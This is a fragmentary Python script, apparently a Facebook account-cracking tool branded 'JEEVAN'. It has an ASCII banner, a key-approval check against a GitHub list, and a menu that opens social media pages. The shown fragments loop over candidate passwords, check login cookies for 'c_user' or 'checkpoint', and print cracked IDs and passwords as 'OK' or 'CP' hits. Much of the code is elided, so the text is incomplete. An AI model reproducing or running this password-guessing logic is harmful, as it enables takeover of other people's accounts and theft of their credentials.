...
╚█████╔╝███████╗███████╗ ╚████╔╝ ██║  ██║██║ ╚████║
 ╚════╝ ╚══════╝╚══════╝  ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═══╝
  ...
  {H}     {P}[{H}•{P}] Status    : {H}PREMIUM {P}     {N}      {H}     
   ...
   {M}                                                                                                             {P}""")
    print(f"""{GREEN}    JEEVAN DON{P}
 {K}[{H}√{K}]{P} This message is for my haters 
 {K}[{H}√{K}]{P}  {H} The  JEEVAN Is BACK 
...
def approval():
  ...
  print ("""\033[1;37m----------------------------------------------""")
  try:
    httpCaht = requests.get("https://github.com/Jeevanbeb/Apporval/blob/main/JEEVAN.txt").text
    if id in httpCaht:
      ...
      print("\x1b[1;97m >> WhatsApp Ma Send Han Key Bhaii ");
      time.sleep(0.1)
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/FB-JEEVAN");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/FB.JEEVAN.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             break
                ...
                ok+=1
                print(f'\r{P} [{H}JEEVAN-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [JEEVAN-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mJEEVAN-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
